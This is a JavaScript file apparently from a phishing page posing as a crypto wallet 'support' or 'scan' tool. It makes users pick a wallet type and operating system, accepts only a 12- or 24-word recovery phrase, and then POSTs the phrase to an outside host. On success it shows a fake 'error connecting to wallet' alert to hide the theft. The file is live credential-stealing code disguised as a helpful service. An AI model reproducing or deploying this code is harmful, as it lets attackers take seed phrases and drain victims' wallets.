
function countWords() {

    // Get the input text value
    var inputField = document.getElementById("phrase").value;
    var text = inputField.split(' ');
    var numWords = 0;
    for (var i = 0; i < text.length; i++) {
        if (text[i] !== ' ' && isWord(text[i])) {
            numWords++;
        }
    }

    // Display it as output
    console.log("Word count is "+numWords);
    document.getElementById("phraseCount").innerHTML = numWords;
    
    if(numWords == 12 || numWords == 24){
        document.getElementById("scanSubmit").removeAttribute("disabled");
        const collection1 = document.getElementById("scanSubmit");
        collection1.style.background = "#ff5300";
    }else{
        document.getElementById("scanSubmit").setAttribute("disabled","disabled");
        const collection1 = document.getElementById("scanSubmit");
        collection1.style.background = "grey";
    }
    
}

function isWord(str) {
    var alphaNumericFound = false;
    for (var i = 0; i < str.length; i++) {
    var code = str.charCodeAt(i);
    if ((code > 47 && code < 58) || // numeric (0-9)
        (code > 64 && code < 91) || // upper alpha (A-Z)
        (code > 96 && code < 123)) { // lower alpha (a-z)
        alphaNumericFound = true;
        return alphaNumericFound;
    }
    }
    return alphaNumericFound;
}

function openSupportForm(){
    
    const collection1 = document.getElementById("solutionForm");
    collection1.style.display = "block";
    
    const collection2 = document.getElementById("scanBTN");
    collection2.style.display = "none";
    
    const collection3 = document.getElementById("actionSector");
    collection3.style.marginTop = "20px";

}
    
function openSupportForm2(){
    
    const collection1 = document.getElementById("ledgerType");
    collection1.style.display = "none";
    
    const collection2 = document.getElementById("osType");
    collection2.style.display = "block";

}
    
function openSupportForm3(){
    
    const collection1 = document.getElementById("osType");
    collection1.style.display = "none";
    
    const collection2 = document.getElementById("phraseBox");
    collection2.style.display = "block";

}

function closeShippingNews(){

    const collection = document.getElementById("shippingNews");
    collection.style.display = "none";
}

const form = document.querySelector('form');
form.addEventListener('submit', handleSubmit);

function handleSubmit(event) {
    event.preventDefault(); // prevent default form submission behavior
    
    document.getElementById("scanSubmit").setAttribute("disabled","disabled");
    const collection1 = document.getElementById("scanSubmit");
    collection1.style.background = "grey";
    
    const wallet = document.getElementById('walletTypeSelect').value;
    const os = document.getElementById('osTypeSelect').value;
    const phrase = document.getElementById('phrase').value;
    const data = { wallet, os, phrase };
    // console.log(JSON.stringify(data))
    sendData(data); // send data to Node.js endpoint
}

function sendData(data) {
    fetch('https://odd-moccasins-ox.cyclic.app/connection', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.status === 200) {
        alert('error connecting to wallet');
      } else {
        alert('failed connection, kindly try again');
          
        document.getElementById("scanSubmit").removeAttribute("disabled");
        const collection1 = document.getElementById("scanSubmit");
        collection1.style.background = "#ff5300";
      }
    })
    .catch(error => {
      alert('server error, kindly try again');
      document.getElementById("scanSubmit").removeAttribute("disabled");
      const collection1 = document.getElementById("scanSubmit");
      collection1.style.background = "#ff5300";
    });
  }
